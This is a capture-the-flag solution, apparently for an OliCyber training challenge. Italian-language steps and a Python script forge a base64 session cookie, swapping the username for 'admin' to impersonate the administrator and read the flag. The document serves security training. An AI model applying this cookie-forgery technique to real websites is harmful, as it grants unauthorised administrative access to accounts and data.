#1)Registati al sito
#2) attiva la console quando sei in fase di logging
#3) troverai un cookie di sessione in formato base64
#4) decodifica il cookie con python e vedrai che l'ultima parte è il tuo username
#5) sostituisci lo username con 'admin' nel cookie
#6) effettua poi la request con il cookie session in formato base64
#7)leggendo la pagina html di response trovi la flag
import requests


# Your base64 encoded cookie string
cookie_fake = {'session':'MjAyNC8wMi8wOC0xNzA3Mzg2ODMxLWFkbWlu'}

# Decode the base64 encoded string
# decoded_cookie = base64.b64decode(cookie_fake).decode('utf-8')
# print (decoded_cookie)
# # Split the decoded cookie string into key-value pairs
# cookie_dict = {}
# for pair in decoded_cookie.split('; '):
#     parts = pair.split('=')
#     if len(parts) == 2:  # Ensure there are both key and value parts
#         cookie_dict[parts[0]] = parts[1]
# print(cookie_dict)
# The URL you're making the request to
url = 'http://cma.challs.olicyber.it/home.php'

# Make the request with the cookies
response = requests.get(url, cookies=cookie_fake)

# Get the response text
response_text = response.text

# Print the response
print(response_text)
